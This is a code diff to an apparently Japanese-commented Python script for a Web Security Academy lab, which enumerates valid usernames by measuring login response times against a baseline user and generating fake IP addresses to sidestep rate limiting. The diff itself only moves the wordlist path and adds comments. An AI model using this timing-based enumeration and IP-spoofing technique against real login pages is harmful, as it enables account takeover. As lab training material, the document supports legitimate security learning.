@@ -1,7 +1,11 @@
 import concurrent.futures
 import threading
+from pathlib import Path
 
 import requests
+
+ROOT = Path(__file__).resolve().parent.parent
+USERNAMES_FILE = ROOT / "wordlists" / "usernames.txt"
 
 URL = "https://0a7900e7047bef828050d05000560095.web-security-academy.net/login"
 TRIES_PER_USER = 3
@@ -13,13 +17,14 @@ _thread_local = threading.local()
 
 
 def get_session():
+    # スレッドごとに requests.Session を使い回し、コネクションを再利用する
     if not hasattr(_thread_local, "session"):
         _thread_local.session = requests.Session()
     return _thread_local.session
 
 
 def index_to_fake_ip(index):
-    # 10.0.0.1 から順に払い出し、常に有効なIPv4を生成する。
+    # 10.0.0.1 から順に払い出し、常に有効な IPv4 を生成する
     host = index + 1
     a = 10 + ((host // (256 * 256 * 256)) % 245)
     b = (host // (256 * 256)) % 256
@@ -44,11 +49,12 @@ def measure_username(index, username):
 
 
 def main():
-    with open("usernames.txt", "r") as f:
+    with open(USERNAMES_FILE, "r") as f:
         listed_usernames = f.read().splitlines()
 
     others = [u for u in listed_usernames if u != "wiener"]
 
+    # 既知ユーザーの応答時間を基準値として取得する
     print("[*] ベースライン: wiener を先に計測")
     base_user, base_time = measure_username(0, "wiener")
     print(f"{base_user}:{base_time:.6f}")
@@ -71,6 +77,7 @@ def main():
             scored.append((username, response_time, delta, is_candidate))
             print(f"{username}:{response_time:.6f} | delta:{delta:+.6f} {marker}")
 
+    # 差分の大きい順に上位 10 件を候補として出力する
     print("\n[*] delta 上位候補")
     for username, response_time, delta, is_candidate in sorted(
         scored, key=lambda row: row[2], reverse=True
